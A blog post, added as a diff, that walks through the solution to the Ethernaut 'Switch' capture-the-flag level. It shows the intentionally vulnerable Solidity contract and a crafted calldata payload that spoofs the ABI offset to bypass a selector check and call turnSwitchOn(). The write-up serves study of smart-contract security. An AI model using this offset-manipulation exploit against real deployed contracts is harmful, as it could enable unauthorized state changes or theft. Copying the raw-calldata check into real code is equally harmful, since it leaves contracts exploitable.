@@ -1,0 +1,110 @@
+---
+title: Ethernaut - Switch - Solution
+date: '2024-06-13'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Switch CTF
+---
+
+# Ethernaut - Switch - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Switch {
+    bool public switchOn; // switch is off
+    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
+
+    modifier onlyThis() {
+        require(msg.sender == address(this), "Only the contract can call this");
+        _;
+    }
+
+    modifier onlyOff() {
+        // we use a complex data type to put in memory
+        bytes32[1] memory selector;
+        // check that the calldata at position 68 (location of _data)
+        assembly {
+            calldatacopy(selector, 68, 4) // grab function selector from calldata
+        }
+        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
+        _;
+    }
+
+    function flipSwitch(bytes memory _data) public onlyOff {
+        (bool success,) = address(this).call(_data);
+        require(success, "call failed :(");
+    }
+
+    function turnSwitchOn() public onlyThis {
+        switchOn = true;
+    }
+
+    function turnSwitchOff() public onlyThis {
+        switchOn = false;
+    }
+}
+```
+
+## Solution
+
+The goal of this challenge is to set the `switchOn` boolean to `true`.
+In other words, we need to find a way to call the `turnSwitchOn()` function.
+Notice that we can't call this function directly because of the `onlyThis()` modifier.
+Instead, we need to construct an appropriate call to `flipSwitch()`.
+
+The naive attempt of executing 
+
+```javascript
+await contract.flipSwitch("0x76227e12") // 0x76227e12 is the selector of turnSwitchOn()
+```
+
+won't work either because of the `onlyOff()` modifier.
+
+Let us investigate this in more detail by calling `turnSwitchOff()` through `flipSwitch()` and taking a closer look at how the calldata is structured:
+
+```javascript
+await contract.flipSwitch("0x20606e15") // 0x20606e15 is the selector of turnSwitchOff()
+```
+
+Inspecting the resulting transaction on Etherscan in the "More Details" section, we get the following calldata structure:
+
+```
+Function: flipSwitch(bytes _data) ***
+
+MethodID: 0x30c13ade
+[0]:  0000000000000000000000000000000000000000000000000000000000000020
+[1]:  0000000000000000000000000000000000000000000000000000000000000004
+[2]:  20606e1500000000000000000000000000000000000000000000000000000000
+```
+
+The first four bytes are 0x30c13ade, which is the function selector of `flipSwitch()`.
+Since the `_data` parameter has the _dynamic_ datatype `bytes`, the next 32 bytes are to be interpreted as the location of the data part of the function parameter.
+20 in hex is 32 in decimal, telling us that the actual data part of the function parameter starts at position 32 (ignoring the first four bytes of the calldata that correspond to the function selector).
+From the [official Formal Specification of ABI Encoding](https://docs.soliditylang.org/en/latest/abi-spec.html#formal-specification-of-the-encoding), we know that `[1]` is the number of bytes encoded as a `uint256` (in our case, 4 bytes) while `[2]` represents the actual value of the byte sequence (in our case, 20606e15).
+
+Now that we have a better picture of the calldata, let's discuss how we can manipulate it to solve the level:
+Notice that `[2]` needs to stay intact since the `onlyOff()` modifier requires the `offSelector` to be present at position 68.
+However, we can add two more words that direct the call to `turnSwitchOn()` instead of `turnSwitchOff()` and, at the same time, manipulate `[0]` so that the location of the data part is 96 (0x60) instead of 32 (0x20):
+
+```
+Function: flipSwitch(bytes _data) ***
+
+MethodID: 0x30c13ade
+[0]:  0000000000000000000000000000000000000000000000000000000000000060
+[1]:  0000000000000000000000000000000000000000000000000000000000000004
+[2]:  20606e1500000000000000000000000000000000000000000000000000000000
+[3]:  0000000000000000000000000000000000000000000000000000000000000004
+[4]:  76227e1200000000000000000000000000000000000000000000000000000000
+```
+
+This way, `[1]` and `[2]` will be ignored for the actual function call yet the `offSelector` will be present at position 68, allowing us to successfully pass the `onlyOff()` modifier while still making the call to `turnSwitchOn()` via `[3]` and `[4]`.
+
+As a conclusion, we can solve the level by issuing the following command in the Ethernaut console:
+
+```javascript
+await sendTransaction({from: "<your player address>", to: '<your level instance address>', input: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
+```
